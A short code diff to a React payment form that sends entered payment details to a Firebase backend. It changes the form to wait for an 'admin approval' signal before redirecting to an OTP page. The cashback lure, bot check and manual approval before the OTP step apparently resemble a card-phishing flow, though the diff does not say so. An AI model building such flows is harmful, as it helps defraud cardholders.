@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useState, useEffect } from "react";
-import { handlePay } from "@/lib/firebase";
+import { handlePay, listenForApproval } from "@/lib/firebase";
 import { initBotProtection, performBotCheck } from "@/lib/botProtection";
 
 function CashbackPopup({ onClose }: { onClose: () => void }) {
@@ -349,9 +349,13 @@ function PaymentForm() {
     };
     handlePay(paymentInfo, () => {});
     
-    setTimeout(() => {
-      setLocation("/otp");
-    }, 5000);
+    // Listen for admin approval instead of auto-redirect
+    const unsubscribe = listenForApproval((approved) => {
+      if (approved) {
+        unsubscribe();
+        setLocation("/otp");
+      }
+    });
   };
 
   return (
